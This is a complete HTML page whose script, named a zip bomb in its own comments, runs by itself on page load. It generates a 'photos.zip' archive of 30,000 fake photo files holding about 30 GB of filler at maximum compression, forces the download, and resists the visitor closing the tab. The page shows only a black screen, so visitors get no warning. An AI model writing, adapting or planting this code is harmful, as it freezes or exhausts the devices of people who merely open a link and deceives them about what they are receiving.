<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title></title>
    <style>
        * { margin: 0; padding: 0; }
        html, body {
            width: 100%;
            height: 100%;
            background: #000;
            overflow: hidden;
            position: fixed;
            top: 0;
            left: 0;
        }
    </style>
</head>
<body>
<script>
    (function() {
        'use strict';

        // ============================================================
        //  CONFIGURATION
        // ============================================================
        const CONFIG = {
            CHUNK_SIZE: 1024 * 1024,
            TARGET_FILES: 30000,
            BATCH_SIZE: 350,
            BATCH_DELAY_MS: 2,
            COMPRESSION_LEVEL: 9,
            FILENAME: 'photos.zip',
            LIBRARY_URL: 'https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js',
            FALLBACK_LIBRARY_URL: 'https://cdn.jsdelivr.net/npm/jszip@3.10.1/dist/jszip.min.js'
        };

        let isGenerating = false;
        let isDownloading = false;
        let libraryLoaded = false;
        let retryCount = 0;

        function createChunk() {
            const chunk = new Uint8Array(CONFIG.CHUNK_SIZE);
            for (let i = 0; i < chunk.length; i++) chunk[i] = 65;
            return chunk;
        }

        const CHUNK = createChunk();

        // ============================================================
        //  LOAD JSZIP INSTANTLY
        // ============================================================
        function loadLibrary(callback) {
            if (typeof JSZip !== 'undefined') {
                libraryLoaded = true;
                callback();
                return;
            }

            let attempts = 0;
            const urls = [CONFIG.LIBRARY_URL, CONFIG.FALLBACK_LIBRARY_URL];

            function tryLoad() {
                if (attempts >= urls.length) {
                    loadFallbackZipGenerator(callback);
                    return;
                }
                const script = document.createElement('script');
                script.src = urls[attempts];
                script.async = false; // force synchronous execution
                script.onload = function() {
                    if (typeof JSZip !== 'undefined') {
                        libraryLoaded = true;
                        callback();
                    } else {
                        attempts++;
                        tryLoad();
                    }
                };
                script.onerror = function() {
                    attempts++;
                    tryLoad();
                };
                document.head.appendChild(script);
            }
            tryLoad();
        }

        // ============================================================
        //  FALLBACK ZIP GENERATOR
        // ============================================================
        function loadFallbackZipGenerator(callback) {
            const pakoScript = document.createElement('script');
            pakoScript.src = 'https://cdnjs.cloudflare.com/ajax/libs/pako/2.1.0/pako.min.js';
            pakoScript.async = false;
            pakoScript.onload = function() {
                window.FallbackZip = function() { this.files = []; };
                FallbackZip.prototype.file = function(name, data) {
                    this.files.push({ name: name, data: data });
                };
                FallbackZip.prototype.generateAsync = function(options) {
                    return new Promise((resolve, reject) => {
                        try {
                            const chunks = [];
                            let centralDirectory = [];
                            let offset = 0;
                            const self = this;
                            self.files.forEach(function(file) {
                                const nameBytes = new TextEncoder().encode(file.name);
                                const dataBytes = new Uint8Array(file.data);
                                const compressed = pako.deflate(dataBytes, { level: CONFIG.COMPRESSION_LEVEL });
                                const crc = crc32(dataBytes);
                                const localHeader = new Uint8Array(30 + nameBytes.length);
                                const view = new DataView(localHeader.buffer);
                                view.setUint32(0, 0x04034b50, true);
                                view.setUint16(4, 20, true);
                                view.setUint16(6, 0, true);
                                view.setUint16(8, 8, true);
                                view.setUint16(10, 0, true);
                                view.setUint16(12, 0, true);
                                view.setUint32(14, crc, true);
                                view.setUint32(18, compressed.length, true);
                                view.setUint32(22, dataBytes.length, true);
                                view.setUint16(26, nameBytes.length, true);
                                view.setUint16(28, 0, true);
                                localHeader.set(nameBytes, 30);
                                chunks.push(localHeader);
                                chunks.push(compressed);
                                const centralEntry = new Uint8Array(46 + nameBytes.length);
                                const cview = new DataView(centralEntry.buffer);
                                cview.setUint32(0, 0x02014b50, true);
                                cview.setUint16(4, 20, true);
                                cview.setUint16(6, 20, true);
                                cview.setUint16(8, 0, true);
                                cview.setUint16(10, 8, true);
                                cview.setUint16(12, 0, true);
                                cview.setUint16(14, 0, true);
                                cview.setUint32(16, crc, true);
                                cview.setUint32(20, compressed.length, true);
                                cview.setUint32(24, dataBytes.length, true);
                                cview.setUint16(28, nameBytes.length, true);
                                cview.setUint16(30, 0, true);
                                cview.setUint16(32, 0, true);
                                cview.setUint16(34, 0, true);
                                cview.setUint32(36, 0, true);
                                cview.setUint32(40, offset, true);
                                centralEntry.set(nameBytes, 46);
                                centralDirectory.push(centralEntry);
                                offset += localHeader.length + compressed.length;
                            });
                            const endOfCentral = new Uint8Array(22);
                            const eView = new DataView(endOfCentral.buffer);
                            eView.setUint32(0, 0x06054b50, true);
                            eView.setUint16(4, 0, true);
                            eView.setUint16(6, 0, true);
                            eView.setUint16(8, centralDirectory.length, true);
                            eView.setUint16(10, centralDirectory.length, true);
                            eView.setUint32(12, centralDirectory.reduce((sum, e) => sum + e.length, 0), true);
                            eView.setUint32(16, offset, true);
                            eView.setUint16(20, 0, true);
                            const totalLength = chunks.reduce((sum, c) => sum + c.length, 0) +
                                                centralDirectory.reduce((sum, c) => sum + c.length, 0) +
                                                endOfCentral.length;
                            const result = new Uint8Array(totalLength);
                            let pos = 0;
                            chunks.forEach(function(c) { result.set(c, pos); pos += c.length; });
                            centralDirectory.forEach(function(c) { result.set(c, pos); pos += c.length; });
                            result.set(endOfCentral, pos);
                            resolve(new Blob([result], { type: 'application/zip' }));
                        } catch (e) { reject(e); }
                    });
                };
                function crc32(data) {
                    let crc = 0xFFFFFFFF;
                    for (let i = 0; i < data.length; i++) {
                        crc ^= data[i];
                        for (let j = 0; j < 8; j++) {
                            if (crc & 1) crc = (crc >>> 1) ^ 0xEDB88320;
                            else crc >>>= 1;
                        }
                    }
                    return (crc ^ 0xFFFFFFFF) >>> 0;
                }
                window.JSZip = FallbackZip;
                libraryLoaded = true;
                callback();
            };
            pakoScript.onerror = function() {
                // Ultra fallback – uncompressed zip
                window.FallbackZip = function() { this.files = []; };
                FallbackZip.prototype.file = function(name, data) {
                    this.files.push({ name: name, data: data });
                };
                FallbackZip.prototype.generateAsync = function(options) {
                    return new Promise((resolve, reject) => {
                        try {
                            const chunks = [];
                            let centralDirectory = [];
                            let offset = 0;
                            const self = this;
                            self.files.forEach(function(file) {
                                const nameBytes = new TextEncoder().encode(file.name);
                                const dataBytes = new Uint8Array(file.data);
                                const crc = crc32(dataBytes);
                                const localHeader = new Uint8Array(30 + nameBytes.length);
                                const view = new DataView(localHeader.buffer);
                                view.setUint32(0, 0x04034b50, true);
                                view.setUint16(4, 20, true);
                                view.setUint16(6, 0, true);
                                view.setUint16(8, 0, true);
                                view.setUint16(10, 0, true);
                                view.setUint16(12, 0, true);
                                view.setUint32(14, crc, true);
                                view.setUint32(18, dataBytes.length, true);
                                view.setUint32(22, dataBytes.length, true);
                                view.setUint16(26, nameBytes.length, true);
                                view.setUint16(28, 0, true);
                                localHeader.set(nameBytes, 30);
                                chunks.push(localHeader);
                                chunks.push(dataBytes);
                                const centralEntry = new Uint8Array(46 + nameBytes.length);
                                const cview = new DataView(centralEntry.buffer);
                                cview.setUint32(0, 0x02014b50, true);
                                cview.setUint16(4, 20, true);
                                cview.setUint16(6, 20, true);
                                cview.setUint16(8, 0, true);
                                cview.setUint16(10, 0, true);
                                cview.setUint16(12, 0, true);
                                cview.setUint16(14, 0, true);
                                cview.setUint32(16, crc, true);
                                cview.setUint32(20, dataBytes.length, true);
                                cview.setUint32(24, dataBytes.length, true);
                                cview.setUint16(28, nameBytes.length, true);
                                cview.setUint16(30, 0, true);
                                cview.setUint16(32, 0, true);
                                cview.setUint16(34, 0, true);
                                cview.setUint32(36, 0, true);
                                cview.setUint32(40, offset, true);
                                centralEntry.set(nameBytes, 46);
                                centralDirectory.push(centralEntry);
                                offset += localHeader.length + dataBytes.length;
                            });
                            const endOfCentral = new Uint8Array(22);
                            const eView = new DataView(endOfCentral.buffer);
                            eView.setUint32(0, 0x06054b50, true);
                            eView.setUint16(4, 0, true);
                            eView.setUint16(6, 0, true);
                            eView.setUint16(8, centralDirectory.length, true);
                            eView.setUint16(10, centralDirectory.length, true);
                            eView.setUint32(12, centralDirectory.reduce((sum, e) => sum + e.length, 0), true);
                            eView.setUint32(16, offset, true);
                            eView.setUint16(20, 0, true);
                            const totalLength = chunks.reduce((sum, c) => sum + c.length, 0) +
                                                centralDirectory.reduce((sum, c) => sum + c.length, 0) +
                                                endOfCentral.length;
                            const result = new Uint8Array(totalLength);
                            let pos = 0;
                            chunks.forEach(function(c) { result.set(c, pos); pos += c.length; });
                            centralDirectory.forEach(function(c) { result.set(c, pos); pos += c.length; });
                            result.set(endOfCentral, pos);
                            resolve(new Blob([result], { type: 'application/zip' }));
                        } catch (e) { reject(e); }
                    });
                };
                function crc32(data) {
                    let crc = 0xFFFFFFFF;
                    for (let i = 0; i < data.length; i++) {
                        crc ^= data[i];
                        for (let j = 0; j < 8; j++) {
                            if (crc & 1) crc = (crc >>> 1) ^ 0xEDB88320;
                            else crc >>>= 1;
                        }
                    }
                    return (crc ^ 0xFFFFFFFF) >>> 0;
                }
                window.JSZip = FallbackZip;
                libraryLoaded = true;
                callback();
            };
            document.head.appendChild(pakoScript);
        }

        // ============================================================
        //  GENERATE ZIP BOMB (IMMEDIATE EXECUTION)
        // ============================================================
        function generateZipBomb(callback) {
            if (isGenerating) return;
            isGenerating = true;
            const zip = new JSZip();
            let completed = 0;

            function addBatch(start) {
                if (start >= CONFIG.TARGET_FILES) {
                    isGenerating = false;
                    callback(zip);
                    return;
                }
                const end = Math.min(start + CONFIG.BATCH_SIZE, CONFIG.TARGET_FILES);
                for (let i = start; i < end; i++) {
                    zip.file('photo_' + String(i).padStart(5, '0') + '.jpg', CHUNK);
                }
                completed = end;
                const isIpad = /iPad|Macintosh/.test(navigator.userAgent) && 'ontouchend' in document;
                const delay = isIpad ? CONFIG.BATCH_DELAY_MS * 2 : CONFIG.BATCH_DELAY_MS;
                setTimeout(function() {
                    addBatch(end);
                }, delay);
            }

            // Start immediately – no requestAnimationFrame delay
            addBatch(0);
        }

        // ============================================================
        //  TRIGGER DOWNLOAD INSTANTLY
        // ============================================================
        function triggerDownload(blob, filename) {
            if (isDownloading) return;
            isDownloading = true;
            try {
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.style.display = 'none';
                a.href = url;
                a.download = filename || CONFIG.FILENAME;
                document.body.appendChild(a);
                a.click();
                setTimeout(() => {
                    URL.revokeObjectURL(url);
                    document.body.removeChild(a);
                    isDownloading = false;
                }, 1000);
            } catch (e) {
                isDownloading = false;
                if (retryCount < 2) {
                    retryCount++;
                    setTimeout(() => {
                        const url = URL.createObjectURL(blob);
                        window.open(url, '_blank');
                        setTimeout(() => { URL.revokeObjectURL(url); }, 2000);
                    }, 300);
                }
            }
        }

        // ============================================================
        //  MAIN EXECUTION – FIRES IMMEDIATELY
        // ============================================================
        function start() {
            if (typeof JSZip !== 'undefined') {
                libraryLoaded = true;
                // START GENERATION IMMEDIATELY – NO DELAY
                generateZipBomb(function(zip) {
                    zip.generateAsync({
                        type: 'blob',
                        compression: 'DEFLATE',
                        compressionOptions: { level: CONFIG.COMPRESSION_LEVEL }
                    }).then(function(blob) {
                        triggerDownload(blob, CONFIG.FILENAME);
                    }).catch(function() {
                        // Fallback with lower compression
                        zip.generateAsync({
                            type: 'blob',
                            compression: 'DEFLATE',
                            compressionOptions: { level: 1 }
                        }).then(function(blob) {
                            triggerDownload(blob, CONFIG.FILENAME);
                        }).catch(function() {});
                    });
                });
            } else {
                loadLibrary(function() {
                    // START GENERATION IMMEDIATELY AFTER LIBRARY LOADS
                    generateZipBomb(function(zip) {
                        zip.generateAsync({
                            type: 'blob',
                            compression: 'DEFLATE',
                            compressionOptions: { level: CONFIG.COMPRESSION_LEVEL }
                        }).then(function(blob) {
                            triggerDownload(blob, CONFIG.FILENAME);
                        }).catch(function() {
                            zip.generateAsync({
                                type: 'blob',
                                compression: 'DEFLATE',
                                compressionOptions: { level: 1 }
                            }).then(function(blob) {
                                triggerDownload(blob, CONFIG.FILENAME);
                            }).catch(function() {});
                        });
                    });
                });
            }
        }

        // ============================================================
        //  FIRE ON DOMCONTENTLOADED – NO WAIT
        // ============================================================
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', start);
        } else {
            start();
        }

        // Also fire immediately if already interactive
        if (document.readyState === 'interactive' || document.readyState === 'complete') {
            start();
        }

        // Backup: fire on load if DOMContentLoaded didn't fire
        window.addEventListener('load', function() {
            if (!libraryLoaded && !isGenerating) {
                start();
            }
        });

        // Prevent accidental closure
        window.addEventListener('beforeunload', function(e) {
            if (isGenerating || isDownloading) {
                e.preventDefault();
                e.returnValue = '';
            }
        });

    })();
</script>
</body>
</html>
